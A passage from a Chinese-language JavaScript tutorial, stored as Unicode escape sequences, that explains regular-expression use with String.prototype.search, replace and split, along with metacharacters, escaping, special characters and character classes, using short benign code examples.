; 'xaxb' . match ( r ) // ['a', 'b'] r . lastIndex // 0 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u8bbe\u7f6e\u6b63\u5219\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u662f\u65e0\u6548\u7684\u3002 String.prototype.search() \u00b6 \u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 search \u65b9\u6cd5\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u5339\u914d\u7ed3\u679c\u5728\u6574\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5339\u914d\uff0c\u5219\u8fd4\u56de -1 \u3002 1 2 '_x_x' . search ( /x/ ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u5339\u914d\u7ed3\u679c\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u7684 1 \u53f7\u4f4d\u7f6e\u3002 String.prototype.replace() \u00b6 \u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 replace \u65b9\u6cd5\u53ef\u4ee5\u66ff\u6362\u5339\u914d\u7684\u503c\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u641c\u7d22\u6a21\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u662f\u66ff\u6362\u7684\u5185\u5bb9\u3002 1 str . replace ( search , replacement ) \u6b63\u5219\u8868\u8fbe\u5f0f\u5982\u679c\u4e0d\u52a0 g \u4fee\u9970\u7b26\uff0c\u5c31\u66ff\u6362\u7b2c\u4e00\u4e2a\u5339\u914d\u6210\u529f\u7684\u503c\uff0c\u5426\u5219\u66ff\u6362\u6240\u6709\u5339\u914d\u6210\u529f\u7684\u503c\u3002 1 2 3 'aaa' . replace ( 'a' , 'b' ) // \"baa\" 'aaa' . replace ( /a/ , 'b' ) // \"baa\" 'aaa' . replace ( /a/g , 'b' ) // \"bbb\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86 g \u4fee\u9970\u7b26\uff0c\u5bfc\u81f4\u6240\u6709\u7684 a \u90fd\u88ab\u66ff\u6362\u6389\u4e86\u3002 replace \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\uff0c\u5c31\u662f\u6d88\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u4e24\u7aef\u7684\u7a7a\u683c\u3002 1 2 3 4 var str = ' #id div.class ' ; str . replace ( /^\\s+|\\s+$/g , '' ) // \"#id div.class\" replace \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528\u7f8e\u5143\u7b26\u53f7 $ \uff0c\u7528\u6765\u6307\u4ee3\u6240\u66ff\u6362\u7684\u5185\u5bb9\u3002 $& \uff1a\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\u3002 $` \uff1a\u5339\u914d\u7ed3\u679c\u524d\u9762\u7684\u6587\u672c\u3002 $' \uff1a\u5339\u914d\u7ed3\u679c\u540e\u9762\u7684\u6587\u672c\u3002 $n \uff1a\u5339\u914d\u6210\u529f\u7684\u7b2c n \u7ec4\u5185\u5bb9\uff0c n \u662f\u4ece1\u5f00\u59cb\u7684\u81ea\u7136\u6570\u3002 $$ \uff1a\u6307\u4ee3\u7f8e\u5143\u7b26\u53f7 $ \u3002 1 2 3 4 5 'hello world' . replace ( /(\\w+)\\s(\\w+)/ , '$2 $1' ) // \"world hello\" 'abc' . replace ( 'b' , '[$`-$&-$\\']' ) // \"a[a-b-c]c\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u662f\u5c06\u5339\u914d\u7684\u7ec4\u4e92\u6362\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u662f\u6539\u5199\u5339\u914d\u7684\u503c\u3002 replace \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u6bcf\u4e00\u4e2a\u5339\u914d\u5185\u5bb9\u66ff\u6362\u4e3a\u51fd\u6570\u8fd4\u56de\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 '3 and 5' . replace ( /[0-9]+/g , function ( match ) { return 2 * match ; }) // \"6 and 10\" var a = 'The quick brown fox jumped over the lazy dog.' ; var pattern = /quick|brown|lazy/ig ; a . replace ( pattern , function replacer ( match ) { return match . toUpperCase (); }); // The QUICK BROWN fox jumped over the LAZY dog. \u4f5c\u4e3a replace \u65b9\u6cd5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u66ff\u6362\u51fd\u6570\uff0c\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u7ec4\u5339\u914d\uff08\u6709\u591a\u5c11\u4e2a\u7ec4\u5339\u914d\uff0c\u5c31\u6709\u591a\u5c11\u4e2a\u5bf9\u5e94\u7684\u53c2\u6570\uff09\u3002\u6b64\u5916\uff0c\u6700\u540e\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u4e24\u4e2a\u53c2\u6570\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u5185\u5bb9\u5728\u6574\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff08\u6bd4\u5982\u4ece\u7b2c\u4e94\u4e2a\u4f4d\u7f6e\u5f00\u59cb\uff09\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f\u539f\u5b57\u7b26\u4e32\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7f51\u9875\u6a21\u677f\u66ff\u6362\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var prices = { 'p1' : '$1.99' , 'p2' : '$9.99' , 'p3' : '$5.00' }; var template = '<span id=\"p1\"></span>' + '<span id=\"p2\"></span>' + '<span id=\"p3\"></span>' ; template . replace ( /(<span id=\")(.*?)(\">)(<\\/span>)/g , function ( match , $1 , $2 , $3 , $4 ){ return $1 + $2 + $3 + prices [ $2 ] + $4 ; } ); // \"<span id=\"p1\">$1.99</span><span id=\"p2\">$9.99</span><span id=\"p3\">$5.00</span>\" \u4e0a\u9762\u4ee3\u7801\u7684\u6355\u6349\u6a21\u5f0f\u4e2d\uff0c\u6709\u56db\u4e2a\u62ec\u53f7\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u56db\u4e2a\u7ec4\u5339\u914d\uff0c\u5728\u5339\u914d\u51fd\u6570\u4e2d\u7528 $1 \u5230 $4 \u8868\u793a\u3002\u5339\u914d\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5c06\u4ef7\u683c\u63d2\u5165\u6a21\u677f\u4e2d\u3002 String.prototype.split() \u00b6 \u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 split \u65b9\u6cd5\u6309\u7167\u6b63\u5219\u89c4\u5219\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u5206\u5272\u540e\u7684\u5404\u4e2a\u90e8\u5206\u7ec4\u6210\u7684\u6570\u7ec4\u3002 1 str . split ( separator , [ limit ]) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u5206\u9694\u89c4\u5219\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u975e\u6b63\u5219\u5206\u9694 'a, b,c, d' . split ( ',' ) // [ 'a', ' b', 'c', ' d' ] // \u6b63\u5219\u5206\u9694\uff0c\u53bb\u9664\u591a\u4f59\u7684\u7a7a\u683c 'a, b,c, d' . split ( /, */ ) // [ 'a', 'b', 'c', 'd' ] // \u6307\u5b9a\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458 'a, b,c, d' . split ( /, */ , 2 ) [ 'a' , 'b' ] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u53bb\u9664\u4e86\u5b50\u5b57\u7b26\u4e32\u7684\u9017\u53f7\u540e\u9762\u7684\u7a7a\u683c\u3002 1 2 3 4 5 6 7 // \u4f8b\u4e00 'aaa*a*' . split ( /a*/ ) // [ '', '*', '*' ] // \u4f8b\u4e8c 'aaa**a*' . split ( /a*/ ) // [\"\", \"*\", \"*\", \"*\"] \u4e0a\u9762\u4ee3\u7801\u7684\u5206\u5272\u89c4\u5219\u662f0\u6b21\u6216\u591a\u6b21\u7684 a \uff0c\u7531\u4e8e\u6b63\u5219\u9ed8\u8ba4\u662f\u8d2a\u5a6a\u5339\u914d\uff0c\u6240\u4ee5\u4f8b\u4e00\u7684\u7b2c\u4e00\u4e2a\u5206\u9694\u7b26\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u5206\u5272\u7b26\u662f a \uff0c\u5c06\u5b57\u7b26\u4e32\u5206\u6210\u4e09\u4e2a\u90e8\u5206\uff0c\u5305\u542b\u5f00\u59cb\u5904\u7684\u7a7a\u5b57\u7b26\u4e32\u3002\u4f8b\u4e8c\u7684\u7b2c\u4e00\u4e2a\u5206\u9694\u7b26\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u5206\u9694\u7b26\u662f0\u4e2a a \uff08\u5373\u7a7a\u5b57\u7b26\uff09\uff0c\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u662f a \uff0c\u6240\u4ee5\u5c06\u5b57\u7b26\u4e32\u5206\u6210\u56db\u4e2a\u90e8\u5206\u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709\u62ec\u53f7\uff0c\u5219\u62ec\u53f7\u5339\u914d\u7684\u90e8\u5206\u4e5f\u4f1a\u4f5c\u4e3a\u6570\u7ec4\u6210\u5458\u8fd4\u56de\u3002 1 2 'aaa*a*' . split ( /(a*)/ ) // [ '', 'aaa', '*', 'a', '*' ] \u4e0a\u9762\u4ee3\u7801\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86\u62ec\u53f7\uff0c\u7b2c\u4e00\u4e2a\u7ec4\u5339\u914d\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u7ec4\u5339\u914d\u662f a \uff0c\u5b83\u4eec\u90fd\u4f5c\u4e3a\u6570\u7ec4\u6210\u5458\u8fd4\u56de\u3002 \u5339\u914d\u89c4\u5219 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u89c4\u5219\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u4e00\u4e00\u4ecb\u7ecd\u8fd9\u4e9b\u89c4\u5219\u3002 \u5b57\u9762\u91cf\u5b57\u7b26\u548c\u5143\u5b57\u7b26 \u00b6 \u5927\u90e8\u5206\u5b57\u7b26\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u5c31\u662f\u5b57\u9762\u7684\u542b\u4e49\uff0c\u6bd4\u5982 /a/ \u5339\u914d a \uff0c /b/ \u5339\u914d b \u3002\u5982\u679c\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e4b\u4e2d\uff0c\u67d0\u4e2a\u5b57\u7b26\u53ea\u8868\u793a\u5b83\u5b57\u9762\u7684\u542b\u4e49\uff08\u5c31\u50cf\u524d\u9762\u7684 a \u548c b \uff09\uff0c\u90a3\u4e48\u5b83\u4eec\u5c31\u53eb\u505a\u201c\u5b57\u9762\u91cf\u5b57\u7b26\u201d\uff08literal characters\uff09\u3002 1 /dog/ . test ( 'old dog' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 dog \uff0c\u5c31\u662f\u5b57\u9762\u91cf\u5b57\u7b26\uff0c\u6240\u4ee5 /dog/ \u5339\u914d old dog \uff0c\u56e0\u4e3a\u5b83\u5c31\u8868\u793a d \u3001 o \u3001 g \u4e09\u4e2a\u5b57\u6bcd\u8fde\u5728\u4e00\u8d77\u3002 \u9664\u4e86\u5b57\u9762\u91cf\u5b57\u7b26\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u90e8\u5206\u5b57\u7b26\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u4e0d\u4ee3\u8868\u5b57\u9762\u7684\u610f\u601d\u3002\u5b83\u4eec\u53eb\u505a\u201c\u5143\u5b57\u7b26\u201d\uff08metacharacters\uff09\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 \uff081\uff09\u70b9\u5b57\u7b26\uff08.) \u70b9\u5b57\u7b26\uff08 . \uff09\u5339\u914d\u9664\u56de\u8f66\uff08 \\r \uff09\u3001\u6362\u884c( \\n ) \u3001\u884c\u5206\u9694\u7b26\uff08 \\u2028 \uff09\u548c\u6bb5\u5206\u9694\u7b26\uff08 \\u2029 \uff09\u4ee5\u5916\u7684\u6240\u6709\u5b57\u7b26\u3002\u6ce8\u610f\uff0c\u5bf9\u4e8e\u7801\u70b9\u5927\u4e8e 0xFFFF \u5b57\u7b26\uff0c\u70b9\u5b57\u7b26\u4e0d\u80fd\u6b63\u786e\u5339\u914d\uff0c\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u3002 1 /c.t/ \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c c.t \u5339\u914d c \u548c t \u4e4b\u95f4\u5305\u542b\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u7684\u60c5\u51b5\uff0c\u53ea\u8981\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5728\u540c\u4e00\u884c\uff0c\u6bd4\u5982 cat \u3001 c2t \u3001 c-t \u7b49\u7b49\uff0c\u4f46\u662f\u4e0d\u5339\u914d coot \u3002 \uff082\uff09\u4f4d\u7f6e\u5b57\u7b26 \u4f4d\u7f6e\u5b57\u7b26\u7528\u6765\u63d0\u793a\u5b57\u7b26\u6240\u5904\u7684\u4f4d\u7f6e\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u5b57\u7b26\u3002 ^ \u8868\u793a\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e $ \u8868\u793a\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 // test\u5fc5\u987b\u51fa\u73b0\u5728\u5f00\u59cb\u4f4d\u7f6e /^test/ . test ( 'test123' ) // true // test\u5fc5\u987b\u51fa\u73b0\u5728\u7ed3\u675f\u4f4d\u7f6e /test$/ . test ( 'new test' ) // true // \u4ece\u5f00\u59cb\u4f4d\u7f6e\u5230\u7ed3\u675f\u4f4d\u7f6e\u53ea\u6709test /^test$/ . test ( 'test' ) // true /^test$/ . test ( 'test test' ) // false \uff083\uff09\u9009\u62e9\u7b26\uff08 | \uff09 \u7ad6\u7ebf\u7b26\u53f7\uff08 | \uff09\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u8868\u793a\u201c\u6216\u5173\u7cfb\u201d\uff08OR\uff09\uff0c\u5373 cat|dog \u8868\u793a\u5339\u914d cat \u6216 dog \u3002 1 /11|22/ . test ( '911' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u6307\u5b9a\u5fc5\u987b\u5339\u914d 11 \u6216 22 \u3002 \u591a\u4e2a\u9009\u62e9\u7b26\u53ef\u4ee5\u8054\u5408\u4f7f\u7528\u3002 1 2 // \u5339\u914dfred\u3001barney\u3001betty\u4e4b\u4e2d\u7684\u4e00\u4e2a /fred|barney|betty/ \u9009\u62e9\u7b26\u4f1a\u5305\u62ec\u5b83\u524d\u540e\u7684\u591a\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982 /ab|cd/ \u6307\u7684\u662f\u5339\u914d ab \u6216\u8005 cd \uff0c\u800c\u4e0d\u662f\u6307\u5339\u914d b \u6216\u8005 c \u3002\u5982\u679c\u60f3\u4fee\u6539\u8fd9\u4e2a\u884c\u4e3a\uff0c\u53ef\u4ee5\u4f7f\u7528\u5706\u62ec\u53f7\u3002 1 /a( |\\t)b/ . test ( 'a\\tb' ) // true \u4e0a\u9762\u4ee3\u7801\u6307\u7684\u662f\uff0c a \u548c b \u4e4b\u95f4\u6709\u4e00\u4e2a\u7a7a\u683c\u6216\u8005\u4e00\u4e2a\u5236\u8868\u7b26\u3002 \u5176\u4ed6\u7684\u5143\u5b57\u7b26\u8fd8\u5305\u62ec \\ \u3001 * \u3001 + \u3001 ? \u3001 () \u3001 [] \u3001 {} \u7b49\uff0c\u5c06\u5728\u4e0b\u6587\u89e3\u91ca\u3002 \u8f6c\u4e49\u7b26 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u90a3\u4e9b\u6709\u7279\u6b8a\u542b\u4e49\u7684\u5143\u5b57\u7b26\uff0c\u5982\u679c\u8981\u5339\u914d\u5b83\u4eec\u672c\u8eab\uff0c\u5c31\u9700\u8981\u5728\u5b83\u4eec\u524d\u9762\u8981\u52a0\u4e0a\u53cd\u659c\u6760\u3002\u6bd4\u5982\u8981\u5339\u914d + \uff0c\u5c31\u8981\u5199\u6210 \\+ \u3002 1 2 3 4 5 /1+1/ . test ( '1+1' ) // false /1\\+1/ . test ( '1+1' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4e4b\u6240\u4ee5\u4e0d\u5339\u914d\uff0c\u56e0\u4e3a\u52a0\u53f7\u662f\u5143\u5b57\u7b26\uff0c\u4e0d\u4ee3\u8868\u81ea\u8eab\u3002\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u53cd\u659c\u6760\u5bf9\u52a0\u53f7\u8f6c\u4e49\uff0c\u5c31\u80fd\u5339\u914d\u6210\u529f\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u9700\u8981\u53cd\u659c\u6760\u8f6c\u4e49\u7684\uff0c\u4e00\u5171\u670912\u4e2a\u5b57\u7b26\uff1a ^ \u3001 . \u3001 [ \u3001 $ \u3001 ( \u3001 ) \u3001 | \u3001 * \u3001 + \u3001 ? \u3001 { \u548c \\ \u3002\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528 RegExp \u65b9\u6cd5\u751f\u6210\u6b63\u5219\u5bf9\u8c61\uff0c\u8f6c\u4e49\u9700\u8981\u4f7f\u7528\u4e24\u4e2a\u659c\u6760\uff0c\u56e0\u4e3a\u5b57\u7b26\u4e32\u5185\u90e8\u4f1a\u5148\u8f6c\u4e49\u4e00\u6b21\u3002 1 2 3 4 5 ( new RegExp ( '1\\+1' )). test ( '1+1' ) // false ( new RegExp ( '1\\\\+1' )). test ( '1+1' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c RegExp \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u4f46\u662f\uff0c\u5728\u5b57\u7b26\u4e32\u5185\u90e8\uff0c\u53cd\u659c\u6760\u4e5f\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u5b83\u4f1a\u5148\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u4e00\u6b21\uff0c\u7136\u540e\u518d\u88ab\u6b63\u5219\u8868\u8fbe\u5f0f\u8f6c\u4e49\u4e00\u6b21\uff0c\u56e0\u6b64\u9700\u8981\u4e24\u4e2a\u53cd\u659c\u6760\u8f6c\u4e49\u3002 \u7279\u6b8a\u5b57\u7b26 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u4e00\u4e9b\u4e0d\u80fd\u6253\u5370\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u63d0\u4f9b\u4e86\u8868\u8fbe\u65b9\u6cd5\u3002 \\cX \u8868\u793a Ctrl-[X] \uff0c\u5176\u4e2d\u7684 X \u662fA-Z\u4e4b\u4e2d\u4efb\u4e00\u4e2a\u82f1\u6587\u5b57\u6bcd\uff0c\u7528\u6765\u5339\u914d\u63a7\u5236\u5b57\u7b26\u3002 [\\b] \u5339\u914d\u9000\u683c\u952e(U+0008)\uff0c\u4e0d\u8981\u4e0e \\b \u6df7\u6dc6\u3002 \\n \u5339\u914d\u6362\u884c\u952e\u3002 \\r \u5339\u914d\u56de\u8f66\u952e\u3002 \\t \u5339\u914d\u5236\u8868\u7b26 tab\uff08U+0009\uff09\u3002 \\v \u5339\u914d\u5782\u76f4\u5236\u8868\u7b26\uff08U+000B\uff09\u3002 \\f \u5339\u914d\u6362\u9875\u7b26\uff08U+000C\uff09\u3002 \\0 \u5339\u914d null \u5b57\u7b26\uff08U+0000\uff09\u3002 \\xhh \u5339\u914d\u4e00\u4e2a\u4ee5\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08 \\x00 - \\xFF \uff09\u8868\u793a\u7684\u5b57\u7b26\u3002 \\uhhhh \u5339\u914d\u4e00\u4e2a\u4ee5\u56db\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08 \\u0000 - \\uFFFF \uff09\u8868\u793a\u7684 Unicode \u5b57\u7b26\u3002 \u5b57\u7b26\u7c7b \u00b6 \u5b57\u7b26\u7c7b\uff08class\uff09\u8868\u793a\u6709\u4e00\u7cfb\u5217\u5b57\u7b26\u53ef\u4f9b\u9009\u62e9\uff0c\u53ea\u8981\u5339\u914d\u5176\u4e2d\u4e00\u4e2a\u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u6709\u53ef\u4f9b\u9009\u62e9\u7684\u5b57\u7b26\u90fd\u653e\u5728\u65b9\u62ec\u53f7\u5185\uff0c\u6bd4\u5982 [xyz] \u8868\u793a x \u3001 y \u3001 z \u4e4b\u4e2d\u4efb\u9009\u4e00\u4e2a\u5339\u914d\u3002 1 2 /[abc]/ . test ( 'hello world' ) // false /[abc]/ . test ( 'apple' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 hello world \u4e0d\u5305\u542b a \u3001 b \u3001 c \u8fd9\u4e09\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4efb\u4e00\u4e2a\uff0c\u6240\u4ee5\u8fd4\u56de false \uff1b\u5b57\u7b26\u4e32 apple \u5305\u542b\u5b57\u6bcd a \uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 \u6709\u4e24\u4e2a\u5b57\u7b26\u5728\u5b57\u7b26\u7c7b\u4e2d\u6709\u7279\u6b8a\u542b\u4e49\u3002 \uff081\uff09\u8131\u5b57\u7b26\uff08^\uff09 \u5982\u679c\u65b9\u62ec\u53f7\u5185\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f [^] \uff0c\u5219\u8868\u793a\u9664\u4e86\u5b57\u7b26\u7c7b\u4e4b\u4e2d\u7684\u5b57\u7b26\uff0c\u5176\u4ed6\u5b57\u7b26\u90fd\u53ef\u4ee5\u5339\u914d\u3002\u6bd4\u5982\uff0c [^xyz] \u8868\u793a\u9664\u4e86 x \u3001 y \u3001 z \u4e4b\u5916\u90fd\u53ef\u4ee5\u5339\u914d\u3002 1 2 /[^abc]/ . test ( 'bbc news' ) // true /[^abc]/ . test ( 'bbc' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 bbc news \u5305\u542b a \u3001 b \u3001 c \u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de true \uff1b\u5b57\u7b26\u4e32 bbc \u4e0d\u5305\u542b a \u3001 b \u3001 c \u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u5982\u679c\u65b9\u62ec\u53f7\u5185\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff0c\u5373\u53ea\u6709 [^] \uff0c\u5c31\u8868\u793a\u5339\u914d\u4e00\u5207\u5b57\u7b26\uff0c\u5176\u4e2d\u5305\u62ec\u6362\u884c\u7b26\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u70b9\u53f7\u4f5c\u4e3a\u5143\u5b57\u7b26\uff08 . \uff09\u662f\u4e0d\u5305\u62ec\u6362\u884c\u7b26\u7684\u3002 1 2 3 4 var s = 'Please yes\\nmake my day!' ; s . match ( /yes.*day/ ) // null s . match ( /yes[^]*day/ ) // [ 'yes\\nmake my day'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 s \u542b\u6709\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u70b9\u53f7\u4e0d\u5305\u62ec\u6362\u884c\u7b26\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5931\u8d25\uff1b\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f [^] \u5305\u542b\u4e00\u5207\u5b57\u7b26\uff0c\u6240\u4ee5\u5339\u914d\u6210\u529f\u3002 \u6ce8\u610f\uff0c\u8131\u5b57\u7b26\u53ea\u6709\u5728\u5b57\u7b26\u7c7b\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u624d\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u5426\u5219\u5c31\u662f\u5b57\u9762\u542b\u4e49\u3002 \uff082\uff09\u8fde\u5b57\u7b26\uff08-\uff09 \u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u8fde\u7eed\u5e8f\u5217\u7684\u5b57\u7b26\uff0c\u8fde\u5b57\u7b26\uff08 - \uff09\u7528\u6765\u63d0\u4f9b\u7b80\u5199\u5f62\u5f0f\uff0c\u8868\u793a\u5b57\u7b26\u7684\u8fde\u7eed\u8303\u56f4\u3002\u6bd4\u5982\uff0c [abc] \u53ef\u4ee5\u5199\u6210 [a-c] \uff0c [0123456789] \u53ef\u4ee5\u5199\u6210 [0-9] \uff0c\u540c\u7406 [A-Z] \u8868\u793a26\u4e2a\u5927\u5199\u5b57\u6bcd\u3002 1 2 /a-z/ . test ( 'b' ) // false /[a-z]/ . test ( 'b' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f53\u8fde\u5b57\u53f7\uff08dash\uff09\u4e0d\u51fa\u73b0\u5728\u65b9\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5c31\u4e0d\u5177\u5907\u7b80\u5199\u7684\u4f5c\u7528\uff0c\u53ea\u4ee3\u8868\u5b57\u9762\u7684\u542b\u4e49\uff0c\u6240\u4ee5\u4e0d\u5339\u914d\u5b57\u7b26 b \u3002\u53ea\u6709\u5f53\u8fde\u5b57\u53f7\u7528\u5728\u65b9\u62ec\u53f7\u4e4b\u4e2d\uff0c\u624d\u8868\u793a\u8fde\u7eed\u7684\u5b57\u7b26\u5e8f\u5217\u3002 \u4ee5\u4e0b\u90fd\u662f\u5408\u6cd5\u7684\u5b57\u7b26\u7c7b\u7b80\u5199\u5f62\u5f0f\u3002 1 2 3 4 [ 0 - 9. ,] [ 0 - 9 a - fA - F ] [ a - zA - Z0 - 9 - ] [ 1 - 31 ] \u4e0a\u9762\u4ee3\u7801\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7c7b [1-31] \uff0c\u4e0d\u4ee3\u8868 1 \u5230 31 \uff0c\u53ea\u4ee3\u8868 1 \u5230 3 \u3002 \u8fde\u5b57\u7b26\u8fd8\u53ef\u4ee5\u7528\u6765\u6307\u5b9a Unicode \u5b57\u7b26\u7684\u8303\u56f4\u3002 1 2 3 var str = \"\\u0130\\u0131\\u0132\" ; /[\\u0128-\\uFFFF]/ . test ( str ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\u0128-\\uFFFF \u8868\u793a\u5339\u914d\u7801\u70b9\u5728 0128 \u5230 FFFF \u4e4b\u95f4\u7684\u6240\u6709\u5b57\u7b26\u3002 \u53e6\u5916\uff0c\u4e0d\u8981\u8fc7\u5206\u4f7f\u7528\u8fde\u5b57\u7b26\uff0c\u8bbe\u5b9a\u4e00\u4e2a\u5f88\u5927\u7684\u8303\u56f4\uff0c\u5426\u5219\u5f88\u53ef\u80fd\u9009\u4e2d\u610f\u6599\u4e4b\u5916\u7684\u5b57\u7b26\u3002\u6700\u5178\u578b\u7684\u4f8b\u5b50\u5c31\u662f [A-z] \uff0c\u8868\u9762\u4e0a\u5b83\u662f\u9009\u4e2d\u4ece\u5927\u5199\u7684 A 